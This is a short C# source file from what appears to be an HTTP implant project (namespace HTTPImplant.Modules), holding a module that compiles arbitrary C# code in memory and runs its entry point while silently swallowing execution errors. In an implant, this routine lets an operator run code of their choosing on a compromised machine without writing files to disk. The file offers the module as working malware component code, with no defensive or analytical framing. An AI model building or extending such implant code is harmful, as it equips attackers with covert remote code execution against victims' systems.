using System;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Text;
using Microsoft.CSharp;

namespace HTTPImplant.Modules
{
    public static class CompileAndRunNET
    {
        public static void ExecuteCS(string sourceCode)
        {
            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters
            {
                ReferencedAssemblies = { "System.dll", "System.Windows.dll", "System.Windows.Forms.dll" },
                GenerateInMemory = true,
                GenerateExecutable = true
            };

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();
/*                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                }*/

                Console.WriteLine("Compilation failed with errors:");
                Console.WriteLine(sb.ToString());
                return;
            }

            Assembly compiledAssembly = results.CompiledAssembly;
            MethodInfo entryPoint = compiledAssembly.EntryPoint;

            if (entryPoint != null)
            {
                try
                {
                    entryPoint.Invoke(null, null); // No parameters needed for your Main method
                }
                catch (Exception)
                {
                    /*Console.WriteLine($"Error during execution: {ex.Message}");*/
                }
            }
            else
            {
                Console.WriteLine("No entry point found in the assembly.");
            }
        }
    }
}
